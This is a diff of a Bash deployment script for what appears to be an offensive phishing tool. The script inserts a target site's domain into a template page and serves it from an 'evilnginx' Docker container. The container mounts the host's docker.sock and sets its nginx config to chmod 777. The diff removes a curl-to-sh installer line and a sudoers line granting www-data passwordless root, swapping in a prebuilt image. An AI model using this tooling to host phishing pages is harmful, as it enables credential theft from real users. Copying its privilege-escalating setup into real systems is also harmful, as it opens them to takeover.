@@ -2,7 +2,7 @@
 
 function banner {
     printf "\e[1;34m                                                     
-    _____       _ _          __     ___   _  ____ 
+     _____       _ _          __     ___   _  ____ 
     | ____|_   _(_) |_ __   __\ \   / / \ | |/ ___|
     |  _| \ \ / / | | '_ \ / _ \ \ / /|  \| | |    
     | |___ \ V /| | | | | | (_) \ V / | |\  | |___ 
@@ -48,17 +48,13 @@ domain=$(echo "$WEBPAGE" | awk -F/ '{print $3}')
 sed -i'' -e "s,_domain_,$domain,g" index_tmp.html
 cd ..
 sudo docker network create nginx-evil 2> /dev/null
-sudo docker run --name evilnginx --rm  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d nginx:1.23.2
-sudo docker exec -it evilnginx bash -c "apt update && apt install apache2 php7.4 sudo -y"
-sudo docker exec -it evilnginx bash -c "curl -fsSL https://get.docker.com | sh"
-sudo docker exec -it evilnginx bash -c "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+sudo docker run --name evilnginx --rm  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d evilnginx
 sudo docker exec -it evilnginx bash -c "cp /data/default.conf /etc/nginx/conf.d/default.conf"
 sudo docker exec -it evilnginx bash -c "chmod 777 /etc/nginx/conf.d/default.conf"
 sudo docker exec -it evilnginx bash -c "nginx -s reload"
-sudo docker exec -it evilnginx bash -c "a2enmod php7.4"
-sudo docker exec -it evilnginx bash -c "service apache2 start"
 sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.html /usr/share/nginx/html/index.html"
 sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.php /var/www/html/index.php"
+sudo docker exec -it evilnginx bash -c "service apache2 start"
 rm ./Files/index_tmp.php
 rm ./Files/index_tmp.html
 printf "\n\e[1;33m[>]Fin nginx..."
